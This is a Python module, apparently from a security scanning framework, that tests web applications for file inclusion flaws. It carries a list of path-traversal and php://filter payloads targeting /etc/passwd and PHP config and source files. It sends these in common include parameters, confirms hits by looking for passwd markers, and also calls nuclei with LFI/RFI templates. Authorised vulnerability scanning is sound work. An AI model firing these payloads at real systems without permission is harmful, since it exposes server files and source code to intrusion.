"""
AEGIS-X File Inclusion Scanner (LFI/RFI)
Algorithm: Path traversal payload injection with response content verification.
"""
from aegisx.core import http_client as requests
import base64
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode

from aegisx.core.orchestration.command_gateway import CommandGateway
from aegisx.core.ui.console import ConsoleUI


class FileInclusionScanner:

    LFI_PAYLOADS = [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\etc/passwd",
        "....//....//....//....//etc/passwd",
        "../../../../../../etc/passwd%00",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index",
        "php://filter/convert.base64-encode/resource=../config",
        "/etc/passwd",
        "file:///etc/passwd",
        "....//....//etc/passwd",
    ]

    LFI_MARKERS = ["root:", "daemon:", "bin/bash", "bin/sh", "nobody:", "/home/"]

    INCLUDE_PARAMS = ["file", "page", "path", "include", "doc", "document",
                      "folder", "root", "pg", "style", "pdf", "template",
                      "php_path", "url", "lang", "dir", "action", "module"]

    def scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"

        # Custom payload testing
        custom = self._custom_lfi_scan(base_url, routes)
        findings.extend(custom)

        # Nuclei supplementary scan
        nuclei = self._run_nuclei_lfi(target)
        findings.extend(nuclei)

        return findings

    def _custom_lfi_scan(self, base_url: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []

        for route in routes:
            url = f"{base_url}{route}" if route.startswith("/") else route
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            target_params = []

            # Check existing params
            for p in params:
                if p.lower() in self.INCLUDE_PARAMS:
                    target_params.append(p)

            # If no params, try injecting common include params
            if not target_params and not params:
                for p in self.INCLUDE_PARAMS[:5]:
                    target_params.append(p)

            for pname in target_params:
                result = self._test_lfi(base_url, parsed.path, pname)
                if result:
                    findings.append(result)
                    break

        return findings

    def _test_lfi(self, base_url: str, path: str, param: str) -> Dict[str, Any] | None:
        url = f"{base_url}{path}"

        for payload in self.LFI_PAYLOADS:
            try:
                resp = requests.get(f"{url}?{param}={payload}", timeout=5)

                # Check for /etc/passwd content
                for marker in self.LFI_MARKERS:
                    if marker in resp.text:
                        ConsoleUI.success(f"[LFI] Local File Inclusion confirmed via '{param}'")
                        return {
                            "finding_type": "Local File Inclusion (LFI)",
                            "base_confidence": 0.96, "consensus_score": 0.96, "score_conflict": False,
                            "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                            "requires_human_approval": False,
                            "recommended_validation": [
                                "Never use user input in file path operations",
                                "Implement allowlist for file includes",
                                "Use chroot/jail for file operations",
                            ],
                            "reasoning": [
                                f"LFI via parameter '{param}' with payload: {payload}",
                                f"Marker '{marker}' found in response",
                                f"URL: {url}",
                            ],
                            "nodes": [], "edges": [],
                        }

                # Check for base64 PHP source
                if "php://filter" in payload and len(resp.text) > 50:
                    try:
                        decoded = base64.b64decode(resp.text.strip()).decode("utf-8", errors="ignore")
                        if "<?php" in decoded or "<?=" in decoded:
                            ConsoleUI.success(f"[LFI] PHP source disclosure via filter wrapper")
                            return {
                                "finding_type": "Local File Inclusion (PHP Source Disclosure)",
                                "base_confidence": 0.95, "consensus_score": 0.95, "score_conflict": False,
                                "risk_level": "HIGH", "governance_class": "ACTIVE_VALIDATION",
                                "requires_human_approval": False,
                                "recommended_validation": ["Disable PHP stream wrappers", "Sanitize include paths"],
                                "reasoning": [f"PHP source exposed via php://filter on '{param}'"],
                                "nodes": [], "edges": [],
                            }
                    except Exception:
                        pass
            except Exception:
                pass
        return None

    def _run_nuclei_lfi(self, target: str) -> List[Dict[str, Any]]:
        import json
        findings = []
        url = f"http://{target}"
        cmd = ["nuclei", "-u", url, "-tags", "lfi,rfi", "-j", "-silent", "-timeout", "5"]
        result = CommandGateway.execute(cmd, timeout=120, description="File Inclusion Scan (Nuclei)")

        if result["success"]:
            for line in result.get("stdout", "").strip().split("\n"):
                if line:
                    try:
                        data = json.loads(line)
                        sev = data.get("info", {}).get("severity", "info").upper()
                        if sev in ["INFO"]:
                            continue
                        findings.append({
                            "finding_type": f"File Inclusion [{data.get('template-id', '')}] - {data.get('info', {}).get('name', '')}",
                            "base_confidence": 0.90, "consensus_score": 0.90, "score_conflict": False,
                            "risk_level": "HIGH" if sev in ["HIGH", "CRITICAL"] else "MEDIUM",
                            "governance_class": "ACTIVE_VALIDATION",
                            "requires_human_approval": False,
                            "recommended_validation": ["Patch file inclusion vulnerability"],
                            "reasoning": [data.get("info", {}).get("description", ""), f"Matched: {data.get('matched-at', '')}"],
                            "nodes": [], "edges": [],
                        })
                    except Exception:
                        pass
        return findings
